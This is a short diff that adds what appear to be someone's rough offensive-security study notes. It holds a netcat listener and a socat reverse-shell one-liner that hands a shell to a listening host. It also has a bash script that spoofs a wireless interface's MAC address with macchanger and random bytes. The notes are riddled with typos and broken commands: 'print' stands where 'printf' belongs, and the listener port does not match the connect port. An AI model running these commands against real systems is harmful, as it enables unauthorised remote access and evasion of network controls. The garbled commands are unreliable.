@@ -1,0 +1,66 @@
+Socket cat   socat
+
+ifconfig eth0 | grep -w inet
+
+inet 192.168.210.56 brodcats
+
+
+nc -nlvp 4444
+
+
+revershell
+
+
+bash -c "socat tcp-connect:192.168.210.56:444 exec:sh,pty,stderr,sane"
+
+
+
+
+
+
+
+-------------------------------------
+
+
+change mac
+
+macchnager -l > new.txt
+
+shuf -n 1  new.txt   
+
+shuffel  -number 1 
+
+
+shuf -n 1  new.txt  | awk '{print $3 }'
+
+
+printf '%02x'  123
+
+hexadecemil chabge 
+
+
+print '%02x:%02x:%02x' 12 123 234
+
+
+
+echo $[RANDOM%256]
+
+
+print '%02x:%02x:%02x' | echo $[RANDOM%256]
+
+
+
+
+#!/bin/bash
+
+macchanger -l > new
+
+maci=$(shuf -n 1 new | awk '{print$3}')
+
+umac=$(print print '%02x:%02x:%02x' $[RANDOM%256] $[RANDOM%256] $[RANDOM%256])
+
+echo "$maci:$umac"
+
+sudo macchanger -m "$maci:$umac" wlan0
+
+
